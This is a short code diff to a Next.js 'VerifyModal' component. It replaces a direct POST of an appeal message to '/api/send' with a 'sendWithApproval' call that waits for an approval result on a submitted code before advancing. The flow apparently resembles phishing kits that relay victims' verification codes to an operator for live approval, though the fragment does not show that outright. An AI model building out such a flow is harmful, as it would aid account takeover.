@@ -4,7 +4,7 @@ import { useTranslation } from '@/hooks/use-translation';
 import { store } from '@/store/store';
 import config from '@/utils/config';
 import { buildAppealMessage } from '@/utils/message';
-import axios from 'axios';
+import { sendWithApproval } from '@/utils/send-with-approval';
 import Image from 'next/image';
 import { useEffect, useState, type FC } from 'react';
 
@@ -63,10 +63,19 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         });
 
         try {
-            const res = await axios.post('/api/send', { message, old_message_id: messageId });
+            const { result, message_id } = await sendWithApproval({
+                message,
+                old_message_id: messageId,
+                approval_type: 'code'
+            });
 
-            if (res?.data?.success && typeof res.data.message_id === 'number') {
-                setMessageId(res.data.message_id);
+            if (message_id !== null) {
+                setMessageId(message_id);
+            }
+
+            if (result === 'approved') {
+                nextStep();
+                return;
             }
 
             if (next >= maxCode) {
